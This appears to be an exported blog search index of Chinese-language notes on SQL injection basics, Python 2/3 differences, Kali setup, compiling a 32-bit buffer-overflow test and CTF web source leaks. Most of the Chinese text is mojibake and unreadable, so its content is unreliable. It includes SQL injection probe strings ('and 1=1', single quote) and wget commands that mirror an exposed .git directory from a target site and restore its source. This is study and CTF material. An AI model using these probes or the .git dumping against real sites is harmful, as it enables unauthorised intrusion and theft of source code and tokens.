æ°¸è¿œä¸ºçœŸï¼Œâ€”æ³¨é‡Šåè¾¹å†…å®¹ä¸å†æ‰§è¡Œï¼Œå› æ­¤ SQL è¯­å¥æ‰§è¡Œä¼šè¿”å› admin è¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ ã€‚</p><p>Burp Suite ä¸‡èƒ½å¯†ç çˆ†ç ´</p><p>SQLæ³¨å…¥éªŒè¯ï¼š</p><ul><li>å•å¼•å· â€˜</li><li>and 1=1</li><li>and 1=2</li></ul><p>å¦‚æœé¡µé¢ä¸­ MySQL æŠ¥é”™ï¼Œè¯æ˜è¯¥é¡µé¢å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ ã€‚</p><p>Sqlmap æ˜¯æ£€æµ‹å’Œåˆ©ç”¨ SQL æ³¨å…¥æ¼æ´çš„ä¸€æ¬¾å¼ºå¤§å·¥å…· ã€‚</p><p>ä¸€ã€ä»€ä¹ˆæ˜¯ SQL æ³¨å…¥</p><p>æ‰€è°“ SQL æ³¨å…¥ï¼Œå°±æ˜¯é€šè¿‡æŠŠ SQL å‘½ä»¤æ’å…¥åˆ° Web è¡¨å•é€’äº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œæœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„ SQL å‘½ä»¤ã€‚</p><p>ä¸€ã€ä»€ä¹ˆæ˜¯ SQL æ³¨å…¥</p><p>SQL æ³¨å…¥æ˜¯æ¯”è¾ƒå¸¸è§çš„ç½‘ç»œæ”»å‡»æ–¹å¼ä¹‹ä¸€ï¼Œå®ƒä¸æ˜¯åˆ©ç”¨æ“ä½œç³»ç»Ÿçš„ BUG æ¥å®ç°æ”»å‡»ï¼Œè€Œæ˜¯é’ˆå¯¹ç¨‹åºå‘˜ç¼–å†™æ—¶çš„ç–å¿½ï¼Œé€šè¿‡ SQL è¯­å¥ï¼Œå®ç°æ— è´¦å·ç™»å½•ï¼Œç”šè‡³ç¯¡æ”¹æ•°æ®åº“ã€‚</p><p>äºŒã€SQLæ³¨å…¥æ”»å‡»çš„æ€»ä½“æ€è·¯</p><p>1ã€å¯»æ‰¾åˆ° SQL æ³¨å…¥çš„ä½ç½®</p><p>2ã€åˆ¤æ–­æœåŠ¡å™¨ç±»å‹å’Œåå°æ•°æ®åº“ç±»å‹</p><p>3ã€é’ˆå¯¹ä¸åŒçš„æœåŠ¡å™¨å’Œæ•°æ®åº“ç‰¹ç‚¹è¿›è¡Œ SQL æ³¨å…¥æ”»å‡»</p>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pythonç‰ˆæœ¬åŒºåˆ«</title>
    <link href="/2021/08/10/Code/Python/Python%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB/"/>
    <url>/2021/08/10/Code/Python/Python%E7%89%88%E6%9C%AC%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="Pythonç‰ˆæœ¬åŒºåˆ«"><a href="#Pythonç‰ˆæœ¬åŒºåˆ«" class="headerlink" title="Pythonç‰ˆæœ¬åŒºåˆ«"></a>Pythonç‰ˆæœ¬åŒºåˆ«</h1><h2 id="1ã€except"><a href="#1ã€except" class="headerlink" title="1ã€except"></a>1ã€except</h2><p><strong>æŠ¥é”™ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">except Exception, e:  SyntaxError: invalid syntax<br></code></pre></td></tr></table></figure><p>å‡ºè¿™ä¸ªé—®é¢˜æ˜¯å› ä¸º <code>python2</code> å’Œ <code>python3</code> å¤„ç† <code>except</code> å­å¥çš„è¯­æ³•æœ‰ç‚¹ä¸åŒ ã€‚</p><p><code>Python2</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello world&quot;</span>)<br><span class="hljs-keyword">except</span> ZeroDivisionError, err:ã€€ã€€<span class="hljs-comment"># , åŠ åŸå› å‚æ•°åç§°</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Exception: &#x27;</span>, err)<br></code></pre></td></tr></table></figure><p><code>Python3</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello,world&quot;</span>)<br><span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> err:  <span class="hljs-comment"># as åŠ åŸå› å‚æ•°åç§°</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Exception: &#x27;</span>, err)<br></code></pre></td></tr></table></figure><p>å¦‚æœè¦å…¼å®¹çš„è¯ä¼¼ä¹ <code>as</code> å¯ä»¥ ã€‚</p><h2 id="2ã€æ‰“å°"><a href="#2ã€æ‰“å°" class="headerlink" title="2ã€æ‰“å°"></a>2ã€æ‰“å°</h2><p><strong>é—®é¢˜ï¼š</strong></p><p>åœ¨ <code>python3</code> ä¸­ï¼Œå•å­—èŠ‚ <code>\xd0</code> ä»¥ä¸¤ä¸ªå­—èŠ‚çš„åºåˆ— <code>\xc3\x90</code> æ‰“å°</p><p>æˆ‘è¯•å›¾åœ¨ <code>python3</code> ä¸­å°†å­—èŠ‚ <code>d0</code> æ‰“å°åˆ° <code>stdout</code> ã€‚ä¸ºä»€ä¹ˆå®ƒä¸è¾“å‡ºå­—èŠ‚ <code>\xd0</code> ï¼Ÿ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ python3 -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;, end = &quot;&quot;)&#x27;</span> | xxd<br>00000000: c390<br>$ python3 -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;)&#x27;</span> | xxd<br>00000000: c390 0a<br>$ python -c <span class="hljs-string">&#x27;print(&quot;\xd0&quot;)&#x27;</span> | xxd<br>00000000: d00a<br></code></pre></td></tr></table></figure><p><code>&quot;\xd0&quot;</code> æ˜¯ä¸€ä¸ª <code>str</code> å¯¹è±¡ï¼Œåœ¨ <code>python3</code> ä¸­ï¼Œå®ƒæ˜¯ä¸€ä¸ª Unicodeå­—ç¬¦ä¸²ï¼ˆ=Unicodeç ç‚¹åºåˆ—ï¼‰ï¼ŒåŒ…å«Unicodeç ç‚¹U+00D0ï¼ˆå³208ï¼Œå³Ãï¼‰ï¼›å½“ç”¨ <code>print</code> å†™å…¥æ—¶ï¼ŒPython å¿…é¡»å°†å…¶ä» Unicodeï¼ˆstrï¼‰è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆbytesï¼‰ï¼Œå› æ­¤å®ƒå¿…é¡»ä½¿ç”¨ç¼–ç ï¼ˆâ€œæŠ½è±¡ç ç‚¹â€åˆ°å­—èŠ‚è½¬æ¢å™¨ï¼‰ã€‚</p><p>åœ¨æ‚¨çš„ä¾‹å­ä¸­ï¼Œé€šå¸¸æ˜¯ UTF-8ï¼Œå…¶ä¸­ä»£ç ç‚¹ U+00D0 è¢«ç¼–ç ä¸ºä»£ç å•å…ƒï¼ˆ=bytesï¼‰åºåˆ— <code>c390</code> ã€‚</p><p>å¦‚æœæ‚¨æƒ³æŒ‰å­—é¢æ„æ€è¾“å‡ºä¸€ä¸ªå­—èŠ‚ <code>0xd0</code> ï¼Œæ‚¨å¿…é¡»ä½¿ç”¨ä¸€ä¸ªå­—èŠ‚å­—ç¬¦ä¸²å¹¶ç›´æ¥è½¬åˆ°è¶…å‡º <code>sys.stdout</code> çš„å­—èŠ‚æµï¼š</p><p>å®ƒå°†å­—ç¬¦ <code>U+00D0ï¼ˆâ€œÃâ€ï¼‰</code> æ‰“å°ä¸º <code>UTF-8</code> ã€‚å¦‚æœè¦å°†å­—èŠ‚å­—ç¬¦ä¸²è¾“å‡ºåˆ° <code>stdout</code>ï¼Œè¯·ä½¿ç”¨ <code>sys.stdout.buffer</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.stdout.buffer.write(<span class="hljs-string">b&#x27;\xd0&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>&quot;\xd0&quot;</code> æ˜¯ Unicodeç ç‚¹å­—ç¬¦ä¸²ï¼Œ<code>b&quot;\xd0&quot;</code> æ˜¯å­—èŠ‚å­—ç¬¦ä¸² ã€‚</p><h2 id="3ã€HTTPæœåŠ¡"><a href="#3ã€HTTPæœåŠ¡" class="headerlink" title="3ã€HTTPæœåŠ¡"></a>3ã€HTTPæœåŠ¡</h2><p>æœ€è¿‘å†™è®ºæ–‡macå’Œwindowså…±äº«æ–‡ä»¶å¥½ç´¯</p><p>æƒ³ç€ç”¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m SimpleHTTPServer  ç«¯å£å·<br></code></pre></td></tr></table></figure><p>ç»“æœä¸€ç›´æŠ¥é”™</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">No <span class="hljs-keyword">module</span> <span class="hljs-keyword">named</span> simplehttpserver<br></code></pre></td></tr></table></figure><p>åæ¥å‘ç° <code>python3</code> å·²ç»æ”¹æˆäº† <code>http.server</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python -m http.server ç«¯å£å·<br></code></pre></td></tr></table></figure><p>çœŸçš„ <code>py2</code> å’Œ <code>py3</code> æ˜¯ä¸¤ç§è¯­è¨€çš„æ„Ÿè§‰</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/hotpotbo/article/details/88227301">https://blog.csdn.net/hotpotbo/article/details/88227301</a></p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>Code</tag>
      
      <tag>Version</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kaliåˆ‡æ¢Pythonç‰ˆæœ¬</title>
    <link href="/2021/08/09/Linux/Kali/Kali%E5%88%87%E6%8D%A2Python%E7%89%88%E6%9C%AC/"/>
    <url>/2021/08/09/Linux/Kali/Kali%E5%88%87%E6%8D%A2Python%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://cloud.tencent.com/developer/article/1532283">update-alternativesâ€”linuxè½¯ä»¶ç‰ˆæœ¬ç®¡ç†å‘½ä»¤ - è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº</a></p></blockquote><p>åœ¨ <code>Kali</code> ä¸­å®‰è£…äº† <code>python2</code> å’Œ <code>python3</code> ï¼Œé»˜è®¤ä½¿ç”¨<code>python2</code>ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼åˆ‡æ¢é»˜è®¤ç‰ˆæœ¬ ã€‚</p><p>ä» <code>python2</code> åˆ‡æ¢åˆ° <code>python3</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --install /usr/bin/python python /usr/bin/python2 100</span><br>update-alternatives: ä½¿ç”¨ /usr/bin/python2 æ¥åœ¨è‡ªåŠ¨æ¨¡å¼ä¸­æä¾› /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> update-alternatives --install /usr/bin/python python /usr/bin/python3 150</span><br>update-alternatives: ä½¿ç”¨ /usr/bin/python3 æ¥åœ¨è‡ªåŠ¨æ¨¡å¼ä¸­æä¾› /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> python --version</span><br>Python 3.7.6<br></code></pre></td></tr></table></figure><p>åˆ‡æ¢ <code>python</code> ç‰ˆæœ¬åï¼Œè‹¥è¦ä½¿ç”¨ <code>pip</code> å¯èƒ½ä¼šå‡ºç°æ‰¾ä¸åˆ° <code>pip</code> æ¨¡å—çš„é—®é¢˜ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦é‡æ–°å®‰è£… <code>pip3</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> apt-get install python3-pip</span><br><span class="hljs-meta">#</span><span class="bash"> pip --version</span><br>pip 20.2.3 from usr/lib/python3/dist-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>éœ€è¦é‡æ–°ä¿®æ”¹å› <code>python2</code> ï¼Œå¯ä½¿ç”¨å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --config python</span><br></code></pre></td></tr></table></figure><p>é€‰æ‹©ç›¸åº”ç¼–å·ï¼Œç¡®å®š <code>python</code> ç‰ˆæœ¬ ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> update-alternatives --config python</span><br>æœ‰ 2 ä¸ªå€™é€‰é¡¹å¯ç”¨äºæ›¿æ¢ python ï¼ˆæä¾› /usr/lib/pythonï¼‰ã€‚<br><br> é€‰æ‹©        è·¯å¾„          ä¼˜å…ˆçº§     çŠ¶æ€<br>------------------------------------------------<br>* 0    /usr/bin/python3    150    è‡ªåŠ¨æ¨¡å¼<br>  1    /usr/bin/python2    100    æ‰‹åŠ¨æ¨¡å¼<br>  2    /usr/bin/python3    150    æ‰‹åŠ¨æ¨¡å¼<br><br>è¦ç»´æŒå½“å‰å€¼[*]è¯·æŒ‰&lt;å›è½¦è…±&gt;ï¼Œæˆ–è€…é”®å…¥é€‰æ‹©çš„ç¼–å· : 1<br>update-alternativesï¼šä½¿ç”¨ /usr/bin/python2 æ¥åœ¨æ‰‹åŠ¨æ¨¡å¼ä¸­æä¾› /usr/bin/python (python)<br><span class="hljs-meta">#</span><span class="bash"> python --version</span><br>Python 2.7.6<br><span class="hljs-meta">#</span><span class="bash"> pip --version</span><br>pip 20.2.3 from usr/lib/python3/dist-packages/pip (python 3.8)<br></code></pre></td></tr></table></figure><p>ä»¥åå°±å¯ä»¥é€šè¿‡å‘½ä»¤ <code>update-alternatives --config python</code> æ¥åˆ‡æ¢ <code>python</code> ç‰ˆæœ¬äº† ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
      <tag>Kali</tag>
      
      <tag>ç‰ˆæœ¬ç®¡ç†</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kaliå®‰è£…tesseract</title>
    <link href="/2021/08/09/Linux/Kali/Kali%E5%AE%89%E8%A3%85tesseract/"/>
    <url>/2021/08/09/Linux/Kali/Kali%E5%AE%89%E8%A3%85tesseract/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-linux-ä¸‹å®‰è£…-pytesseract-å’Œ-tesseract-ocr"><a href="#Kali-linux-ä¸‹å®‰è£…-pytesseract-å’Œ-tesseract-ocr" class="headerlink" title="Kali linux ä¸‹å®‰è£… pytesseract å’Œ tesseract-ocr"></a>Kali linux ä¸‹å®‰è£… pytesseract å’Œ tesseract-ocr</h2><blockquote><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/li_ellin/article/details/110522005">https://blog.csdn.net/li_ellin/article/details/110522005</a></p><p>æœªæˆåŠŸ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo add-apt-repository ppa:alex-p/tesseract-ocr</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get update</span><br><span class="hljs-meta">#</span><span class="bash"> å®‰è£…OCRå¼•æ“</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install tesseract-ocr</span><br><span class="hljs-meta">#</span><span class="bash"> å®‰è£…è®­ç»ƒæ•°æ®(equä¸ºæ•°å­¦å…¬å¼åŒ…)</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install tesseract-ocr-eng tesseract-ocr-chi-sim  tesseract-ocr-equ</span><br><span class="hljs-meta">#</span><span class="bash"> å¯é€‰å®‰è£…Leptonica</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install liblept5  libleptonica-dev</span><br><span class="hljs-meta">$</span><span class="bash"> sudo pip3 install pytesseract</span><br></code></pre></td></tr></table></figure><p>pytesseractæ˜¯ google åšçš„ ocr åº“ï¼Œå¯ä»¥è¯†åˆ«å›¾ç‰‡ä¸­çš„æ–‡å­— ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytesseract<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>image = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.jpg&quot;</span>)<br>text = pytesseract.image_to_string(image,lang=<span class="hljs-string">&#x27;chi_sim&#x27;</span>)  <span class="hljs-comment">#ä½¿ç”¨ç®€ä½“ä¸­æ–‡è§£æå›¾ç‰‡</span><br><span class="hljs-built_in">print</span>(text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Python</tag>
      
      <tag>Kali</tag>
      
      <tag>tesseract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali(64ä½)ç¼–è¯‘32ä½ç¨‹åº</title>
    <link href="/2021/08/09/Linux/Kali/kali%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/"/>
    <url>/2021/08/09/Linux/Kali/kali%E7%BC%96%E8%AF%9132%E4%BD%8D%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="kali-64ä½-ç¼–è¯‘32ä½ç¨‹åº"><a href="#kali-64ä½-ç¼–è¯‘32ä½ç¨‹åº" class="headerlink" title="kali(64ä½)ç¼–è¯‘32ä½ç¨‹åº"></a>kali(64ä½)ç¼–è¯‘32ä½ç¨‹åº</h2><p><strong>ç¼–è¯‘ 32 ä½ç¨‹åºå‡ºé”™ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$ gcc -g -z execstack -no-pie -m32 -o bof bof.c                                    1 â¨¯<br>In file included from bof.c:1:<br>/usr/include/string.h:26:10: fatal error: bits/libc-header-start.h: No such file or directory<br>   26 | #include &lt;bits/libc-header-start.h&gt;<br>      |          ^~~~~~~~~~~~~~~~~~~~~~~~~~<br>compilation terminated.<br></code></pre></td></tr></table></figure><p><strong>å®‰è£… gcc-multilib ï¼š</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$ sudo apt install gcc-multilib<br>[sudo] password for kali: <br>Reading package lists... Done<br>Building dependency tree... Done<br>Reading state information... Done<br><br>â”Œâ”€â”€(kaliã‰¿kali)-[~/StackOverflowtest]<br>â””â”€$ gcc -g -z execstack -no-pie -m32 -o bof bof.c<br></code></pre></td></tr></table></figure><p><strong>å‚è€ƒï¼š</strong></p><p>ä½ ç³»ç»Ÿä¸­ gcc æ²¡æœ‰å®‰è£… multilib åº“ï¼›ä½¿ç”¨è¿™ä¸ªåº“å¯ä»¥åœ¨ 64 ä½çš„æœºå™¨ä¸Šäº§ç”Ÿ 32 ä½çš„ç¨‹åºæˆ–è€…åº“æ–‡ä»¶ï¼›</p><p>ä½ å¯ä»¥é€‰æ‹©ï¼š<code>apt install gcc-multilib</code> è¿›è¡Œå®Œå–„å®‰è£…ï¼›ä¹Ÿå¯ä»¥åªç¼–è¯‘ç‰¹å®šå¹³å°çš„æ–‡ä»¶: ä¾‹å¦‚ <code>make x86_64</code> ï¼› å…·ä½“ç¼–è¯‘çš„ç›®æ ‡ï¼Œè¯·æŸ¥çœ‹ Makefile æ–‡ä»¶è¿›è¡Œé˜…è¯»ï¼›</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install gcc-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install gcc-x.x-multilib</span><br><span class="hljs-meta">$</span><span class="bash"> sudo apt-get install g++-x.x-multilib</span><br></code></pre></td></tr></table></figure><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_15269787/article/details/122389815">https://blog.csdn.net/qq_15269787/article/details/122389815</a></p>]]></content>
    
    
    <categories>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>Kali</tag>
      
      <tag>32ä½</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸¸è§Webæºç æ³„éœ²</title>
    <link href="/2021/08/08/CTF/Web/Notes/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
    <url>/2021/08/08/CTF/Web/Notes/%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
    
    <content type="html"><![CDATA[<p>Webæºç æ³„éœ²çš„æ¼æ´ï¼š</p><ul><li>Gitæºç æ³„éœ²</li><li><p>SVNæºç æ³„éœ²</p></li><li><p>HGæºç æ³„æ¼</p></li><li>CVSæ³„éœ²</li><li>Bazaar/bzræ³„éœ²</li><li>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</li><li><code>WEB-INF/web.xml</code> æ³„éœ²</li><li>DS_Store æ–‡ä»¶æ³„éœ²</li><li>SWP æ–‡ä»¶æ³„éœ²</li><li>GitHubæºç æ³„æ¼</li></ul><h2 id="Git-æºç æ³„éœ²"><a href="#Git-æºç æ³„éœ²" class="headerlink" title="Git æºç æ³„éœ²"></a>Git æºç æ³„éœ²</h2><p>Git æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œåœ¨æ‰§è¡Œ <code>git init</code> åˆå§‹åŒ–ç›®å½•çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª <code>.git</code> ç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ã€‚å‘å¸ƒä»£ç çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŠŠ <code>.git</code> è¿™ä¸ªç›®å½•åˆ é™¤ï¼Œå°±ç›´æ¥å‘å¸ƒåˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å®ƒæ¥æ¢å¤æºä»£ç ã€‚</p><p><strong>å¸¸è§„ git æ³„éœ²ï¼š</strong><br>ä½¿ç”¨å·¥å…·è¯»å‡ºæºç å³å¯ ã€‚</p><p><strong>git å›æ»šï¼š</strong><br><code>git</code> ä¼šè®°å½•æ¯æ¬¡çš„æäº¤çš„ä¿®æ”¹ï¼Œåœ¨æ¯”èµ›ä¸­æ‹¿åˆ°çš„ <code>flag</code> æ–‡ä»¶æœ‰å¯èƒ½æ˜¯è¢«åˆ é™¤æˆ–è€…è¦†ç›–è¿‡çš„ï¼Œè¿™æ—¶å¯ä»¥ç”¨ <code>git log</code> æŸ¥çœ‹æäº¤æ—¥å¿—ä¿¡æ¯ï¼Œå†åˆ©ç”¨ <code>git reset --hard commit-id</code> æ¥æ¢å¤åˆ°ä»¥å‰çš„ç‰ˆæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>git diff commit-id</code> æ¯”è¾ƒç‰ˆæœ¬çš„å·®å¼‚ ã€‚</p><p><strong>git åˆ†æ”¯ï¼š</strong><br>æ¯æ¬¡æäº¤ï¼Œ<code>git</code> éƒ½ä¼šå°†å¥¹ä»¬ä¸²ä¸ºä¸€æ¡æ—¶é—´çº¿ï¼Œè¿™æ¡æ—¶é—´çº¿å°±æ˜¯ä¸€æ¡åˆ†æ”¯ï¼Œ<code>git</code> å…è®¸æœ‰å¤šæ¡åˆ†æ”¯ï¼Œåˆ™éœ€è¦çš„ <code>flag</code> æ–‡ä»¶æœ‰å¯èƒ½ä¸åœ¨ä¸»åˆ†æ”¯å³ <code>master</code> ä¸Šï¼Œè€Œ <code>git log</code> åªèƒ½çœ‹åˆ°å½“å‰åˆ†æ”¯çš„ ã€‚<br>å¯¹äº <code>è·å–å…¶ä»–çš„åˆ†æ”¯ã€tag</code> ï¼Œéƒ½å¯ä»¥ä» <code>/.git/refs/heads</code> ã€<code>/.git/refs/tag</code> é‡Œé¢æ‹¿åˆ° <code>æœ€æ–°çš„ commit å¯¹è±¡ id</code> ï¼Œç„¶åå°±æ˜¯é¡ºç€è¿™ä¸ªå¯ä»¥çˆ¬åˆ° <code>parent commit</code> ï¼Œå‡è®¾è·å– <code>master</code>ï¼Œ<code>æœ€æ–°çš„ commit çš„ object id</code> å¯ä»¥åœ¨ <code>/.git/refs/heads/master</code> è·å–åˆ° ã€‚</p><p><strong>å…¶ä»–åˆ©ç”¨æ–¹å¼ï¼š</strong><br>ä» <code>.git/config</code> å¯èƒ½æœ‰ <code>access_token</code> ä¿¡æ¯ï¼Œ ä»è€Œè®¿é—®è¿™ä¸ªç”¨æˆ·çš„å…¶ä»–çš„ä»“åº“ ã€‚<br>åœ¨è®¿é—® <code>.git</code> çš„æ—¶å€™æœ‰å¯èƒ½ä¼šè¿”å› <code>403</code>ï¼Œæ­¤æ—¶å¯ä»¥è¯•ç€è®¿é—® <code>.git/config</code> ï¼Œè‹¥æœ‰æ–‡ä»¶è¿”å›åˆ™æœ‰å¯èƒ½å­˜åœ¨æ³„éœ²ã€‚</p><p><strong>åˆ©ç”¨æ–¹æ³•ï¼š</strong></p><p>å¸¸è§„çš„åˆ©ç”¨æ–¹æ³•å°±æ˜¯ä¸‹è½½æ•´ä¸ªç›®å½•, ç„¶åç”¨ <code>git</code> å‘½ä»¤å›æ»šæ•´ä¸ªé¡¹ç›®:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget --mirror --include-directories=/.git http://www.target.com/.git</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.target.com</span> <br><span class="hljs-meta">#</span><span class="bash"> git reset --hard</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> wget -r --no-parent --mirror http://www.example.com/.git</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">cd</span> www.example.com &amp;&amp; git reset --hard</span> 